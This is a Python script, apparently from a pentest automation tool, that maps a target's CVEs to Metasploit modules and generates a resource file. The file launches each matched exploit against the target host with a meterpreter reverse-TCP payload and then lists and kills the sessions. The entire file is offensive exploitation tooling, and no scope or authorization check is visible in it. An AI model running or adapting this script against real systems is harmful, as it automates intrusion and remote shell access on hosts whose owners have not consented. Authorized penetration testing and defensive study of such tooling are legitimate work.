import os
import sys
import json
import logging

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "modules")))
from cve import extract_services
from msf_module_matcher import suggest_module
from exploit import validate_module

# Logging Setup
logger = logging.getLogger("reconAIssance")
logger.setLevel(logging.DEBUG)
if not logger.hasHandlers():
    log_formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    file_handler = logging.FileHandler("recon_log.txt", mode='a')
    file_handler.setFormatter(log_formatter)
    logger.addHandler(file_handler)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    logger.addHandler(console_handler)

def load_cves(run_path):
    f = os.path.join(run_path, "cve_summary.json")
    if os.path.exists(f):
        try:
            cves = json.load(open(f))
            logger.info(f"Loaded {len(cves)} CVEs from summary.")
            return cves
        except Exception as e:
            logger.warning(f"Failed to parse cve_summary.json: {e}")
            return {}
    else:
        logger.warning("cve_summary.json not found.")
        return {}

def load_context(run_path):
    f = os.path.join(run_path, "recon.txt")
    if os.path.exists(f):
        try:
            context = ", ".join(extract_services(open(f).read()))
            logger.info(f"Extracted service context: {context}")
            return context
        except Exception as e:
            logger.warning(f"Failed to extract context from recon.txt: {e}")
            return ""
    return ""

def map_cves_to_exploits(cves, context):
    logger.info("Mapping CVEs to exploit modules...")
    result = {}
    for cve_id, cve_entry in cves.items():
        if not isinstance(cve_entry, dict):
            logger.warning(f"Skipping invalid CVE entry (not dict): {cve_id}")
            continue
        match = suggest_module(cve_id, context)
        logger.debug(f"{cve_id} → {match}")
        valid = validate_module(match.get("module")) if match.get("module") else False
        result[cve_id] = {
            "module": match.get("module"),
            "reason": match.get("reason"),
            "valid": valid
        }
    return result

def save_map(mapping, run_path):
    out_file = os.path.join(run_path, "cve2exploit_map.json")
    try:
        with open(out_file, "w") as f:
            json.dump(mapping, f, indent=2)
        logger.info(f"Saved CVE→Exploit mapping to {out_file}")
    except Exception as e:
        logger.exception("Failed to save mapping file.")

def generate_rc(mapping, target, run_path):
    lines = []
    for entry in mapping.values():
        if entry["valid"]:
            lines.extend([
                f"use {entry['module']}",
                f"set RHOSTS {target}",
                "set LHOST 127.0.0.1",
                "set LPORT 4444",
                "set PAYLOAD linux/x86/meterpreter_reverse_tcp",
                "run"
            ])
    if lines:
        lines += ["sleep 4", "sessions -l", "sessions -K", "exit"]
        try:
            rc_file = os.path.join(run_path, "cve2exploit.rc")
            with open(rc_file, "w") as f:
                f.write("\n".join(lines))
            logger.info(f"Generated RC file with {len(lines)} lines: {rc_file}")
        except Exception as e:
            logger.exception("Failed to write .rc file")

def run(target, run_path):
    logger.info(f"Running CVE-to-Exploit mapping for: {target}")
    cves = load_cves(run_path)
    if not cves:
        logger.warning("No CVEs found – exiting.")
        return
    context = load_context(run_path)
    mapping = map_cves_to_exploits(cves, context)
    save_map(mapping, run_path)
    generate_rc(mapping, target, run_path)
    logger.info("Mapping process complete.")

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        logger.error("Missing RECON_KI_TARGET or RECON_KI_RUN_PATH")
        exit(1)
    run(t, p)
